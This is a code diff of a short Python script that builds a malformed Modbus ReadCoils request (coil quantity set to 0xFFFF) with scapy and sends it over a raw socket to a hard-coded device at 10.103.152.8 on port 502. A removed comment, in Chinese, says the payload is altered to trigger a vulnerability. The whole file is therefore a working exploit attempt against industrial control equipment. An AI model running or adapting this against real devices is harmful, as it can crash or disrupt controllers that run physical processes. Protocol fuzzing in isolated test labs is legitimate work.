@@ -1,11 +1,34 @@
+import socket
 from scapy.all import *
 from scapy.contrib.modbus import *
+import logging
 
-# 創建Modbus數據包
-packet = IP(dst="10.103.152.8") / TCP(dport=502) / ModbusADURequest(transId=1) / ModbusPDU01ReadCoilsRequest(startAddr=0x0000, quantity=0x0001)
+logging.basicConfig(level=logging.DEBUG)
 
-# 修改payload以觸發漏洞
-packet[ModbusPDU01ReadCoilsRequest].quantity = 0xFFFF
+def send_modbus_request():
+    try:
+        # 創建Modbus請求
+        modbus_request = ModbusADURequest(transId=1, protoId=0, len=6, unitId=1) / ModbusPDU01ReadCoilsRequest(startAddr=0, quantity=0xFFFF)
+        request_data = bytes(modbus_request)
+        
+        # 使用socket發送請求
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect(('10.103.152.8', 502))
+        logging.info("Connected to server.")
+        
+        s.send(request_data)
+        logging.debug('Sent Modbus request: %s', repr(request_data))
+        
+        response = s.recv(1024)
+        logging.debug('Received response: %s', repr(response))
+        
+        modbus_response = ModbusADUResponse(response)
+        logging.info("Modbus response: %s", modbus_response.show(dump=True))
+        
+        s.close()
+        logging.info("Connection closed.")
+    except Exception as e:
+        logging.error("Error in client communication: %s", e)
 
-# 發送數據包
-send(packet)
+if __name__ == "__main__":
+    send_modbus_request()
